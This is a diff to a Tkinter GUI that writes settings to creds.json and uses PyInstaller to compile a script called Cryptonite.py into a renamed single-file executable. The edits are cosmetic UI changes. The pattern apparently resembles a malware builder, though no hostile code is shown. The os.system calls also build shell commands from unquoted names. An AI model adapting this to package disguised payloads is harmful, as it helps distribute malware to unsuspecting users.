@@ -21,6 +21,7 @@ def selectfolder():
 def generate():
 
     import os
+    import time
     OS = os.name
     if not folder:
         return
@@ -37,8 +38,6 @@ def generate():
     }
     with open("creds.json", "w") as f:
         json.dump(configDict, f)
-    generate_btn.state(["disabled"])
-    generate_btn.config(text = "Generating..")
     os.system(f"pyinstaller --onefile --clean --icon=\"icon.ico\" Cryptonite.py --name {FILE}")
     if OS == "nt":
         os.system(f"MOVE /Y \"{PATH}\\dist\\{FILE}.exe\" \"{PATH}\" && rmdir /Q /S __pycache__ build dist && del /Q {FILE}.spec")
@@ -59,10 +58,6 @@ window.rowconfigure([8], minsize = 100, weight = 1)
 window.resizable(0,0)
 window.columnconfigure(0, minsize = 400, weight = 0)
 window.columnconfigure(1, minsize = 400, weight = 0)
-
-s = ttk.Style()
-s.configure("TButton", font = (("arial", 12)))
-s.configure("W.TButton", font = (("arial", 24)))
 
 # images
 image0 = Image.open("exegen.png")
@@ -125,5 +120,8 @@ filesave.grid(row = 8, column = 0, columnspan = 2, pady = 20, sticky = "n")
 
 generate_btn = tk.Button(master = window, image = image1, command = generate, borderwidth = 0)
 generate_btn.grid(row = 9, column = 0, columnspan = 2, pady = (10, 30))
+
+info_label = tk.Label(window, text = "The generator will automatically close after the exe has been generated.", font=("arial", 12))
+info_label.grid(row = 10, column = 0, columnspan = 2, sticky = "se")
 
 window.mainloop()
